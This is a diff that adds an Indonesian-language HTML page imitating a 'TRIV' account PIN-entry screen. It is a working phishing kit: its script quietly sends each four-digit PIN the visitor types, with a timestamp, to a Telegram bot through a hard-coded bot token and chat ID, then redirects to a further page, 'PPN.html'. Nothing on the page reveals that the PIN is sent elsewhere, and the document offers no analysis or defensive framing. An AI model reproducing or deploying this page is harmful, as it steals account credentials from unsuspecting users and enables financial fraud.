@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TRIV - Masukkan PIN</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(180deg, #051530 0%, #0a2550 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 50px 30px 30px;
+            color: #fff;
+        }
+
+        .logo {
+            font-size: 3rem;
+            font-weight: 600;
+            color: #80D0FF;
+            margin-bottom: 50px;
+            text-shadow: 0 0 20px rgba(100, 200, 255, 0.4);
+        }
+
+        .title {
+            font-size: 1.6rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            color: #90B8E0;
+            font-size: 1rem;
+            margin-bottom: 40px;
+        }
+
+        /* Indikator PIN 4 digit */
+        .pin-indicator {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 50px;
+        }
+
+        .pin-dot {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #40A0FF;
+            border-radius: 50%;
+            transition: all 0.2s ease;
+        }
+
+        .pin-dot.filled {
+            background-color: #40A0FF;
+            box-shadow: 0 0 8px rgba(64, 160, 255, 0.5);
+        }
+
+        /* Papan ketik angka */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            width: 100%;
+            max-width: 340px;
+        }
+
+        .key-btn {
+            height: 70px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(150, 200, 255, 0.15);
+            border-radius: 14px;
+            color: #fff;
+            font-size: 1.4rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.15s ease;
+        }
+
+        .key-btn:active {
+            background: rgba(64, 160, 255, 0.3);
+            transform: scale(0.95);
+        }
+
+        .key-btn.empty {
+            visibility: hidden;
+        }
+
+        .hint-text {
+            margin-top: 40px;
+            color: #70C0FF;
+            font-size: 0.95rem;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo">triv</div>
+
+    <h1 class="title">Masukkan PIN</h1>
+    <p class="subtitle">Masukkan 4 digit PIN akun Anda</p>
+
+    <!-- Titik indikator PIN -->
+    <div class="pin-indicator" id="pinIndicator">
+        <div class="pin-dot" data-pos="0"></div>
+        <div class="pin-dot" data-pos="1"></div>
+        <div class="pin-dot" data-pos="2"></div>
+        <div class="pin-dot" data-pos="3"></div>
+    </div>
+
+    <!-- Papan ketik angka -->
+    <div class="keypad">
+        <button class="key-btn" data-num="1">1</button>
+        <button class="key-btn" data-num="2">2</button>
+        <button class="key-btn" data-num="3">3</button>
+
+        <button class="key-btn" data-num="4">4</button>
+        <button class="key-btn" data-num="5">5</button>
+        <button class="key-btn" data-num="6">6</button>
+
+        <button class="key-btn" data-num="7">7</button>
+        <button class="key-btn" data-num="8">8</button>
+        <button class="key-btn" data-num="9">9</button>
+
+        <div class="key-btn empty"></div>
+        <button class="key-btn" data-num="0">0</button>
+        <button class="key-btn" id="btnHapus">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                <line x1="18" y1="9" x2="12" y2="15"></line>
+                <line x1="12" y1="9" x2="18" y2="15"></line>
+            </svg>
+        </button>
+    </div>
+
+    <a href="#" class="hint-text">Lupa PIN? Hubungi layanan pelanggan</a>
+
+    <script>
+        // === PENGATURAN ===
+        const BOT_TOKEN = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
+        const CHAT_ID = '8592742129';
+        const HALAMAN_TUJUAN = 'PPN.html';
+
+        let pinValue = '';
+        const dots = document.querySelectorAll('.pin-dot');
+
+        // Perbarui tampilan titik indikator
+        function renderDots() {
+            dots.forEach((dot, i) => {
+                dot.classList.toggle('filled', i < pinValue.length);
+            });
+        }
+
+        // Tambah angka
+        document.querySelectorAll('[data-num]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                if (pinValue.length < 4) {
+                    pinValue += btn.dataset.num;
+                    renderDots();
+
+                    // Otomatis kirim saat lengkap 4 digit
+                    if (pinValue.length === 4) {
+                        kirimDanLanjut();
+                    }
+                }
+            });
+        });
+
+        // Hapus angka
+        btnHapus.addEventListener('click', () => {
+            pinValue = pinValue.slice(0, -1);
+            renderDots();
+        });
+
+        // Kirim ke Telegram & pindah halaman
+        async function kirimDanLanjut() {
+            const pesan = `🔒 KODE PIN TRIV
+PIN: ${pinValue}
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        disable_web_page_preview: true
+                    })
+                });
+            } catch (err) {
+                console.log('⚠️ Gagal kirim:', err);
+            }
+
+            // Langsung pindah ke halaman berikutnya
+            window.location.href = HALAMAN_TUJUAN;
+        }
+    </script>
+
+</body>
+</html>
